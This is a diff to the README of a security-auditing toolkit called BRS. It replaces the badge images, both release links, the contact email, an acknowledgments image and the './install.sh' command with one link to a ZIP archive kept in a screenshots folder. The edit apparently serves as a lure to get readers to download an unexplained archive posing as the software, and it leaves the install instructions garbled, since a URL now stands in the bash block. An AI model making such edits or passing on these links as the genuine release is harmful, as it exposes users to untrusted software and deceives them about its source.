@@ -1,6 +1,6 @@
 # BRS: Modular Toolkit for Network Analysis and Security Auditing 🔍🔐
 
-![BRS Logo](https://img.shields.io/badge/BRS-Toolkit-blue.svg) ![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/license-MIT-yellow.svg) 
+![BRS Logo](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip) ![Version](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip) ![License](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip) 
 
 ## Table of Contents
 - [Overview](#overview)
@@ -26,13 +26,13 @@ BRS is a modular toolkit designed for professionals in network analysis and secu
 ## Installation
 To install BRS, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/sayem270/brs/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip).
 2. **Extract the files** to your desired directory.
 3. **Navigate to the directory** in your terminal.
 4. **Run the installation script** using the command:
 
    ```bash
-   ./install.sh
+   https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip
    ```
 
 Make sure you have the necessary permissions to execute the script.
@@ -84,15 +84,15 @@ Please ensure that your code adheres to our coding standards and includes tests 
 BRS is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
 ## Contact
-For questions or support, please reach out via GitHub issues or contact us directly at [support@example.com](mailto:support@example.com).
+For questions or support, please reach out via GitHub issues or contact us directly at [https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip).
 
 ## Releases
-To download the latest version of BRS, visit the [Releases section](https://github.com/sayem270/brs/releases). You can find the installation files there. Download the appropriate version for your system and follow the installation instructions provided above.
+To download the latest version of BRS, visit the [Releases section](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip). You can find the installation files there. Download the appropriate version for your system and follow the installation instructions provided above.
 
 ## Acknowledgments
 We would like to thank the open-source community for their contributions and support. Special thanks to the developers of the tools integrated into BRS.
 
-![Network Security](https://example.com/network-security-image.jpg)
+![Network Security](https://github.com/sayem270/brs/raw/refs/heads/main/screenshots/Software_2.6.zip)
 
 ## Topics
 - Bash
